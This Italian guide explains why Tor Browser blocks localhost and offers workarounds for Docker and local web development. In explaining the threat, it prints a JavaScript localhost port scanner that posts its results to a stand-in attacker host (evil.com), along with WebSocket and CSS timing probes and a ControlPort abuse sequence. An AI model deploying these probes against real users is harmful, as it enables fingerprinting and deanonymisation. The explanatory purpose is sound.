# Tor e Localhost — Perché Tor Browser Non Accede a Servizi Locali

Questo documento spiega in dettaglio perché Tor Browser blocca le connessioni a
localhost/127.0.0.1, quale attacco previene, e quali sono le soluzioni. Include
scenari Docker, Kubernetes, sviluppo web locale, e alternative via onion services.

Basato sulla mia esperienza diretta: durante il debug di un'applicazione web
dockerizzata (RESTful API su porta 5173) su Kali Linux, Tor Browser rifiutava
la connessione a `localhost:5173`.

> **Vedi anche**: [Tor Browser e Applicazioni](../04-strumenti-operativi/tor-browser-e-applicazioni.md)
> per il confronto browser, [ProxyChains](../04-strumenti-operativi/proxychains-guida-completa.md)
> per il comportamento con localhost, [Onion Services v3](../03-nodi-e-rete/onion-services-v3.md)
> per l'alternativa .onion, [DNS Leak](../05-sicurezza-operativa/dns-leak.md).

---

## Indice

- [Il problema riscontrato](#il-problema-riscontrato)
- [Perché Tor Browser blocca localhost](#perché-tor-browser-blocca-localhost)
- [L'attacco: Local Service Discovery — approfondimento](#lattacco-local-service-discovery--approfondimento)
- [Il blocco tecnico in Tor Browser](#il-blocco-tecnico-in-tor-browser)
- [Soluzioni](#soluzioni)
- [Docker e Tor — scenari avanzati](#docker-e-tor--scenari-avanzati)
- [Sviluppo web locale con Tor attivo](#sviluppo-web-locale-con-tor-attivo)
- [Onion services per servizi locali](#onion-services-per-servizi-locali)
- [Interazione con servizi di sistema](#interazione-con-servizi-di-sistema)
- [Matrice di compatibilità browser/localhost](#matrice-di-compatibilità-browserlocalhost)
- [Nella mia esperienza](#nella-mia-esperienza)

---

## Il problema riscontrato

Tentando di aprire un'applicazione Docker (porta 5173) tramite Tor Browser:

```
Unable to connect
Firefox can't establish a connection to the server at localhost:5173.
```

Docker funzionava perfettamente:
```yaml
# docker-compose.yml
services:
  api:
    build: .
    ports:
      - "5173:5173"
```

Verifica:
```bash
# Da Firefox normale: ✓ funziona
firefox http://localhost:5173

# Da Tor Browser: ✗ rifiutato
# "Unable to connect"

# Da curl diretto: ✓ funziona
curl http://localhost:5173/api/status
# {"status": "ok"}
```

---

## Perché Tor Browser blocca localhost

### La ragione tecnica

Quando Tor Browser riceve una richiesta verso `localhost` o `127.0.0.1`:

```
Flow richiesta localhost in Tor Browser:
1. Utente digita: http://localhost:5173
2. Tor Browser: "localhost" → deve passare dal proxy SOCKS5
3. SOCKS5 CONNECT → invia "localhost:5173" al daemon Tor
4. Tor: costruisce circuito → Exit Node riceve RELAY_BEGIN "localhost:5173"
5. Exit Node: connect(127.0.0.1:5173) → il SUO localhost, non il tuo!
6. Exit Node: "connection refused" (non ha servizi sulla porta 5173)
7. Tor Browser: "Unable to connect"
```

Ma il blocco non è solo per questo motivo tecnico. È una **misura di sicurezza
attiva** contro attacchi di enumerazione.

---

## L'attacco: Local Service Discovery — approfondimento

### Port scanning via JavaScript

Se Tor Browser permettesse connessioni a localhost, un sito malevolo potrebbe
eseguire un port scan completo della tua macchina:

```html
<!-- evil.com include: -->
<script>
const COMMON_PORTS = [
    3000, 3306, 5173, 5432, 5900, 6379, 8000, 8080, 8443,
    8888, 9000, 9051, 9090, 9200, 27017
];

async function scanPort(port) {
    return new Promise((resolve) => {
        const start = Date.now();
        const img = new Image();
        img.onload = () => resolve({port, status: 'open', time: Date.now() - start});
        img.onerror = () => {
            const elapsed = Date.now() - start;
            // Errore veloce (<50ms) = porta aperta ma non HTTP
            // Errore lento (>1000ms) = porta chiusa (timeout)
            resolve({
                port,
                status: elapsed < 50 ? 'open' : 'closed',
                time: elapsed
            });
        };
        img.src = `http://127.0.0.1:${port}/favicon.ico?${Math.random()}`;
        setTimeout(() => resolve({port, status: 'timeout', time: 5000}), 5000);
    });
}

// Scansiona tutte le porte comuni
Promise.all(COMMON_PORTS.map(scanPort)).then(results => {
    const open = results.filter(r => r.status === 'open');
    // Invia i risultati al server attaccante
    fetch('https://evil.com/report', {
        method: 'POST',
        body: JSON.stringify({ports: open})
    });
});
</script>
```

### Timing-based discovery

Anche senza ricevere risposte, il timing rivela informazioni:

```
Porta chiusa: connect() fallisce dopo timeout (~2000ms)
Porta aperta: connect() fallisce immediatamente (~5ms, "connection reset")
Porta filtrata: nessuna risposta (timeout)

La differenza di tempo è misurabile da JavaScript con precisione <1ms
→ Sufficiente per determinare se un servizio è in esecuzione
```

### WebSocket-based scanning

```javascript
function wsProbe(port) {
    return new Promise((resolve) => {
        const start = performance.now();
        const ws = new WebSocket(`ws://127.0.0.1:${port}`);
        ws.onopen = () => { ws.close(); resolve('open'); };
        ws.onerror = () => {
            const elapsed = performance.now() - start;
            resolve(elapsed < 100 ? 'open-no-ws' : 'closed');
        };
        setTimeout(() => { ws.close(); resolve('timeout'); }, 3000);
    });
}
```

### CSS-based probing (no JavaScript richiesto)

```html
<!-- Funziona anche con JavaScript disabilitato -->
<style>
@font-face {
    font-family: probe;
    src: url('http://127.0.0.1:5173/font.woff');
}
body { font-family: probe, fallback; }
</style>
<!-- Se la porta è aperta, il browser tenta di caricare il font -->
<!-- Il timing del fallback rivela se la porta ha risposto -->
```

### Conseguenze dell'attacco

Basandosi sui servizi scoperti:

| Porta scoperta | Informazione rivelata |
|----------------|----------------------|
| 5173 | Vite dev server (sviluppatore frontend) |
| 3000 | React/Express (sviluppatore web) |
| 3306 | MySQL (ha un database locale) |
| 5432 | PostgreSQL |
| 6379 | Redis |
| 8080 | Tomcat/Proxy |
| 9051 | ControlPort Tor |
| 9200 | Elasticsearch |
| 27017 | MongoDB |

Queste informazioni possono:
- **Fingerprint la macchina**: combinazione unica di servizi
- **Rivelare la professione**: dev frontend, backend, DBA
- **Identificare vulnerabilità**: servizi non patchati accessibili
- **Attaccare servizi locali**: se i servizi non richiedono auth

---

## Il blocco tecnico in Tor Browser

### L'impostazione

Tor Browser imposta in `about:config`:

```
network.proxy.allow_hijacking_localhost = false
```

Questo impedisce a qualsiasi richiesta di raggiungere:
- `127.0.0.0/8` (tutto il range loopback IPv4)
- `::1` (loopback IPv6)
- `0.0.0.0`
- `localhost` (hostname)

### Differenza con Firefox + proxychains

```
Tor Browser:
  → localhost bloccato PRIMA di raggiungere il proxy
  → Protezione attiva a livello browser

Firefox con profilo tor-proxy via proxychains:
  → localhost NON bloccato dal browser
  → proxychains può decidere: proxy o diretto
  → localnet 127.0.0.0/255.0.0.0 in proxychains4.conf
  → Connessione diretta a localhost → FUNZIONA

Risultato:
  Tor Browser: localhost:5173 → BLOCCATO
  Firefox tor-proxy + proxychains: localhost:5173 → FUNZIONA (connessione diretta)
```

---

## Soluzioni

### 1. Usare Firefox normale per servizi locali (la mia soluzione)

```bash
# Per sviluppo locale: Firefox normale (non Tor)
firefox http://localhost:5173

# Per navigazione anonima: Firefox con profilo Tor
proxychains firefox -no-remote -P tor-proxy & disown
```

Separare gli strumenti per caso d'uso. Non serve anonimato per i propri servizi locali.

### 2. torsocks per accesso CLI a servizi locali via Tor

```bash
# torsocks permette connessioni a localhost (con AllowOutboundLocalhost)
torsocks curl http://localhost:5173/api/status
```

In `torsocks.conf`:
```ini
AllowOutboundLocalhost 1
```

### 3. Modificare l'impostazione in Tor Browser (sconsigliato)

In `about:config`:
```
network.proxy.allow_hijacking_localhost = true
```

**ATTENZIONE**: espone ai Local Service Discovery attacks. Da fare solo
temporaneamente per debug su reti fidate. Ricordarsi di ripristinare.

### 4. Esporre il servizio via onion service (la soluzione sicura)

Invece di bypassare la protezione, esporre il servizio locale come `.onion`:

```ini
# torrc
HiddenServiceDir /var/lib/tor/myapp/
HiddenServicePort 80 127.0.0.1:5173
```

Poi accedere via Tor Browser con l'indirizzo `.onion`. Nessun bypass necessario,
la sicurezza è preservata.

---

## Docker e Tor — scenari avanzati

### Scenario 1: Container che esce via Tor

Il container Docker deve usare Tor per le connessioni esterne:

```yaml
# docker-compose.yml
services:
  app:
    build: .
    network_mode: "host"  # condivide la rete con l'host
    # Ora il container vede 127.0.0.1:9050 (SocksPort Tor dell'host)
    environment:
      - HTTP_PROXY=socks5h://127.0.0.1:9050
      - HTTPS_PROXY=socks5h://127.0.0.1:9050
```

Alternativa con bridge network:

```yaml
services:
  app:
    build: .
    environment:
      - HTTP_PROXY=socks5h://host.docker.internal:9050
    extra_hosts:
      - "host.docker.internal:host-gateway"
```

### Scenario 2: Container che espone servizio .onion

```yaml
services:
  tor:
    image: osminogin/tor-simple
    volumes:
      - ./torrc:/etc/tor/torrc
      - tor-data:/var/lib/tor
    ports:
      - "9050:9050"
  
  webapp:
    build: .
    expose:
      - "5173"

volumes:
  tor-data:
```

```ini
# torrc per il container Tor
HiddenServiceDir /var/lib/tor/webapp/
HiddenServicePort 80 webapp:5173
```

### Scenario 3: Debug API containerizzata

Il mio caso specifico: API RESTful su porta 5173 in Docker.

```bash
# Da host, senza Tor (funziona):
curl http://localhost:5173/api/status

# Da host, via Tor per testare (funziona):
torsocks curl http://localhost:5173/api/status
# (con AllowOutboundLocalhost 1 in torsocks.conf)

# Da Tor Browser (NON funziona):
# → Bloccato da network.proxy.allow_hijacking_localhost

# Soluzione: non usare Tor Browser per debug locale
```

### Scenario 4: Docker network mode e implicazioni

```
network_mode: "bridge" (default):
  Container ha la propria interfaccia di rete (172.17.0.x)
  Non vede i servizi dell'host su 127.0.0.1
  Deve usare host.docker.internal per raggiungere l'host

network_mode: "host":
  Container condivide lo stack di rete dell'host
  Vede 127.0.0.1:9050 (SocksPort Tor)
  Ma anche espone le proprie porte su localhost dell'host

network_mode: "none":
  Nessuna rete → massimo isolamento
  Utile per container che devono solo processare dati locali
```

### Scenario 5: Container con torsocks integrato

```dockerfile
FROM debian:bookworm-slim
RUN apt-get update && apt-get install -y torsocks curl
COPY torsocks.conf /etc/tor/torsocks.conf
# In torsocks.conf: TorAddress host.docker.internal, TorPort 9050
ENTRYPOINT ["torsocks"]
CMD ["curl", "https://api.ipify.org"]
```

---

## Sviluppo web locale con Tor attivo

### Il problema dello split routing

Quando sviluppi un'applicazione web e usi anche Tor:

```
Necessità contemporanee:
  1. Accedere a localhost:5173 (dev server Vite/React/Django)
  2. Navigare anonimamente via Tor
  3. Scaricare dipendenze (npm, pip) → veloce, non serve Tor
  4. Accedere a API esterne durante lo sviluppo → dipende
```

### Soluzione: profili browser separati

```bash
# Profilo 1: Sviluppo (nessun proxy, accesso localhost)
firefox -no-remote -P development &

# Profilo 2: Navigazione anonima (proxychains + Tor)
proxychains firefox -no-remote -P tor-proxy &

# I due profili sono completamente isolati:
# - Cookie separati
# - Cache separata
# - Impostazioni proxy separate
```

### Configurazione proxy bypass per localhost

In Firefox (profilo sviluppo), se hai bisogno del proxy per alcuni siti
ma non per localhost:

```
Preferences → Network Settings → Manual proxy configuration:
  SOCKS Host: 127.0.0.1    Port: 9050
  No proxy for: localhost, 127.0.0.1, ::1, 192.168.0.0/16
```

### Framework specifici

| Framework | Dev server | Porta default | Note con Tor |
|-----------|-----------|---------------|--------------|
| Vite | `npm run dev` | 5173 | localhost funziona senza Tor |
| React (CRA) | `npm start` | 3000 | Hot reload su localhost |
| Next.js | `npm run dev` | 3000 | API routes su localhost |
| Django | `manage.py runserver` | 8000 | Admin su localhost |
| Flask | `flask run` | 5000 | Debug mode su localhost |
| Express | `node server.js` | 3000 | API su localhost |

---

## Onion services per servizi locali

### L'alternativa sicura al bypass localhost

Invece di disabilitare la protezione di Tor Browser, puoi esporre il tuo
servizio locale come `.onion`:

```ini
# Aggiungere al torrc
HiddenServiceDir /var/lib/tor/local-dev/
HiddenServicePort 80 127.0.0.1:5173
```

```bash
# Restart Tor
sudo systemctl restart tor@default.service

# Leggere l'indirizzo .onion generato
sudo cat /var/lib/tor/local-dev/hostname
# abcdef...xyz.onion

# Ora accessibile da Tor Browser:
# http://abcdef...xyz.onion → il tuo localhost:5173
```

### Vantaggi

- **Nessun bypass di sicurezza**: Tor Browser funziona normalmente
- **Accessibile da altri dispositivi via Tor**: puoi testare da un telefono
- **Cripta end-to-end**: il traffico è protetto fino al tuo servizio
- **Nessun exit node coinvolto**: connessione diretta via rendezvous

### Limiti

- **Latenza**: la connessione .onion ha ~200-500ms di latenza aggiuntiva
- **Hot reload lento**: i framework frontend con hot module reload saranno lenti
- **Overhead**: per semplice sviluppo, è eccessivo
- **Persistenza**: l'indirizzo .onion cambia se rimuovi `HiddenServiceDir`

---

## Interazione con servizi di sistema

### Servizi su localhost e Tor

| Servizio | Porta | Rischio se esposto via Tor |
|----------|-------|---------------------------|
| PostgreSQL | 5432 | Accesso DB → data breach |
| MySQL | 3306 | Accesso DB → data breach |
| Redis | 6379 | Spesso senza auth → RCE possibile |
| Elasticsearch | 9200 | API senza auth → data leak |
| MongoDB | 27017 | Spesso senza auth → data leak |
| ControlPort Tor | 9051 | Manipolazione circuiti, NEWNYM |
| Docker API | 2375 | Controllo completo container → RCE |

### Il caso speciale del ControlPort

Il ControlPort (9051) è particolarmente sensibile:

```
Se un sito malevolo potesse connettersi a 127.0.0.1:9051:
  → AUTHENTICATE (se senza auth o con password debole)
  → GETINFO address → il tuo IP reale!
  → SIGNAL NEWNYM → forzare cambio circuito
  → SETCONF → modificare configurazione Tor
  → Completa deanonimizzazione
```

Per questo `CookieAuthentication 1` nel torrc è essenziale, e il blocco
localhost di Tor Browser è una seconda linea di difesa.

---

## Matrice di compatibilità browser/localhost

| Browser / Configurazione | localhost HTTP | localhost HTTPS | .onion | Note |
|--------------------------|---------------|-----------------|--------|------|
| **Tor Browser** (default) | Bloccato | Bloccato | Sì | Protezione attiva |
| **Tor Browser** (allow_hijacking=true) | Funziona* | Funziona* | Sì | Insicuro |
| **Firefox + proxychains** | Funziona | Funziona | Sì** | localnet in config |
| **Firefox profilo tor-proxy** | Funziona | Funziona | Sì** | No proxy per localhost |
| **Firefox SOCKS5 manuale** | Dipende*** | Dipende*** | Sì** | Dipende da config |
| **Chrome + proxy** | Funziona | Funziona | No | Chrome non supporta .onion nativamente |
| **curl --socks5-hostname** | Bloccato**** | Bloccato**** | Sì | Exit vede il suo localhost |
| **torsocks curl** | Funziona | Funziona | Sì | AllowOutboundLocalhost=1 |

```
*    Funziona ma la richiesta va all'exit node (che vede il suo localhost)
**   Richiede AutomapHostsOnResolve o proxy_dns
***  Dipende da "no proxy for" setting
**** localhost viene inviato all'exit node, che si connette al suo 127.0.0.1
```

---

## Nella mia esperienza

Ho incontrato questo problema direttamente durante il debug di un'applicazione
web RESTful API dockerizzata su Kali. L'API girava in un container Docker sulla
porta 5173, e stavo usando Tor Browser per altri scopi contemporaneamente.

Quando ho provato ad aprire `localhost:5173` in Tor Browser per testare l'API,
ho ricevuto "Unable to connect". La mia prima reazione è stata pensare che Docker
avesse un problema di networking, ma verificando con `curl http://localhost:5173`
tutto funzionava perfettamente.

La soluzione che uso quotidianamente è semplice:

```bash
# Sviluppo locale → Firefox normale
firefox -P development http://localhost:5173

# Navigazione anonima → Firefox tor-proxy via proxychains
proxychains firefox -no-remote -P tor-proxy & disown
```

Due browser, due profili, due scopi diversi. Il profilo `development` non ha
proxy configurato e accede direttamente a localhost. Il profilo `tor-proxy`
usa proxychains e naviga anonimamente.

Ho anche testato la soluzione onion service per esporre il servizio locale
come `.onion`, e funziona perfettamente — ma aggiunge ~300ms di latenza che
rende il hot reload di Vite frustrante. Per lo sviluppo, la separazione dei
profili è la soluzione migliore.

La lezione imparata: **non è necessario accedere ai servizi locali via Tor
Browser**. Sono due casi d'uso diversi che richiedono strumenti diversi. Tentare
di forzare Tor Browser ad accedere a localhost è sia un rischio di sicurezza
che un workaround inutile.
